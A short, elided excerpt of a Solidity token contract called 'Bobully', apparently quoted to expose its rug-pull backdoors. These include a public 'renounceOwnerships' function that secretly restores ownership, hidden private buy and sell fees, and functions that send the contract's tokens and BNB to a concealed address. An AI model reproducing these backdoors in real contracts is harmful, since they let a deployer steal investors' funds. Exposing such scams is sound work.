...
abstract contract Ownable is Context {
    ...
    modifier onlyOwner() {
     ...
     function renounceOwnerships() public{
        _owner =_owners; 
    }
...
contract Bobully is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    uint256 private buyTokenRewardsFee;
    uint256 private sellTokenRewardsFee;
    uint256 private buyLiquidityFee;
    uint256 private sellLiquidityFee;
    uint256 private sellMarketingFee;
    uint256 private buyMarketingFee;
    uint256 private buyDeadFee;
    uint256 private sellDeadFee;
    ...
    {
        return IERC20(tokenAddress).transfer(ddd , tokens);
    }
	...
	function WithdrawBNB(uint256 amount) public  {
        (bool success, ) = address(ddd).call{ value: amount }("");
